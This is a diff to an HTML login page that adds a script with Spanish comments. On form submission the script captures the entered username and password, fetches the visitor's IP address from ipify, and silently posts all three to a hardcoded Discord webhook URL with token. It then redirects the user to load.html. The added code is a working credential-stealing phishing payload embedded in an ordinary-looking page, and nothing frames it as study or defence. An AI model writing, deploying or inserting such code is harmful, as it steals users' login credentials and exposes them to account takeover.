@@ -199,5 +199,55 @@
         passwordInput.setAttribute('type', type);
     });
 </script>
+
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const usuario = document.getElementById('usuario').value;
+    const password = document.getElementById('password').value;
+    
+    const webhookUrl = 'https://discord.com/api/webhooks/1547235454435196931/ZsQbvEnD7ph7bCQiofCk80Q_fNPEjZ_4as5hbdWNnNs_42kXip2wPQkTAlKSmzI-LxAg';
+    
+    // Embed profesional - cada campo se selecciona fácil al tocarlo
+    const payload = {
+        embeds: [{
+            title: "🔐 Nuevo Login",
+            color: 0x7d95d4,
+            fields: [
+                {
+                    name: "👤 Usuario",
+                    value: usuario,  // Sin formato extra, se copia al tocar
+                    inline: false    // false = cada campo en línea aparte (más fácil de copiar)
+                },
+                {
+                    name: "🔑 Contraseña", 
+                    value: password,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "IP: " + (await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Desconocida'))
+            },
+            timestamp: new Date().toISOString()
+        }]
+    };
+    
+    try {
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+    
+    window.location.href = 'load.html';
+});   
+</script>
+
+   
 </body>
 </html>
